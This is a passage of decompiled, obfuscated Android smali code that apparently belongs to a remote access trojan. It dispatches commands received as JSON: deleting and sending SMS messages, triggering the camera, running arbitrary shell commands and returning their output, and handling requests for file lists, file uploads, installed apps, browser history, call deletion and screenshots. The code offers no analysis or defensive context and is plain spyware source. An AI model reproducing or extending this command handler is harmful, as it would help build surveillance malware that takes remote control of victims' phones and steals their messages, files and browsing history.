    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_10

    .line 356
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v0

    invoke-static {v0}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "content://sms/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "smsid"

    invoke-virtual {v10, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1, v12, v12}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 358
    return-object v15

    .line 359
    :cond_10
    const-string v1, "sendsms"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_11

    .line 361
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v0

    invoke-virtual {v0, v10}, Li/a/a/r;->J(Lorg/json/JSONObject;)V

    .line 363
    return-object v15

    .line 364
    :cond_11
    const-string v1, "filemanager"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_12

    .line 367
    return-object v15

    .line 368
    :cond_12
    const-string v1, "takecamera"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_13

    .line 371
    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Li/a/a/q;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 372
    .local v0, "startIntent":Landroid/content/Intent;
    const/high16 v1, 0x10000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 373
    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 374
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 375
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 376
    return-object v15

    .line 379
    .end local v0    # "startIntent":Landroid/content/Intent;
    :cond_13
    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_15

    .line 380
    const-string v1, "command"

    invoke-virtual {v10, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 381
    .local v1, "command":Ljava/lang/String;
    const/4 v2, 0x0

    invoke-static {v1, v2}, Ln/a/a/e/b;->a(Ljava/lang/String;Z)Ln/a/a/e/b$a;

    move-result-object v2

    .line 382
    .local v2, "result":Ln/a/a/e/b$a;
    iget v4, v2, Ln/a/a/e/b$a;->a:I

    if-nez v4, :cond_14

    .line 383
    iget-object v4, v2, Ln/a/a/e/b$a;->b:Ljava/lang/String;

    .line 384
    .local v4, "name":Ljava/lang/String;
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 387
    .local v5, "objv":Lorg/json/JSONObject;
    invoke-virtual {v5, v13, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 388
    invoke-virtual {v5, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 389
    return-object v15

    .line 382
    .end local v1    # "command":Ljava/lang/String;
    .end local v2    # "result":Ln/a/a/e/b$a;
    .end local v4    # "name":Ljava/lang/String;
    .end local v5    # "objv":Lorg/json/JSONObject;
    :cond_14
    goto :goto_0

    .line 391
    :cond_15
    const-string v0, "deletecalls"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_16

    :goto_0
    goto :goto_1

    .line 393
    :cond_16
    const-string v0, "voice_message"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_17

    goto :goto_1

    .line 395
    :cond_17
    const-string v0, "get_list_file"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_18

    goto :goto_1

    .line 397
    :cond_18
    const-string v0, "upload_file_path"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_19

    goto :goto_1

    .line 399
    :cond_19
    const-string v0, "application_list"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    goto :goto_1

    .line 401
    :cond_1a
    const-string v0, "browser_history"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1b

    goto :goto_1

    .line 403
    :cond_1b
    const-string v0, "get_screenshot"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_0

    .line 409
    .end local v11    # "event":Ljava/lang/String;
    :goto_1
    nop

    .line 412
    return-object v12

    .line 407
    :catch_0
    move-exception v0

    .line 408
    .local v0, "e":Lorg/json/JSONException;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method
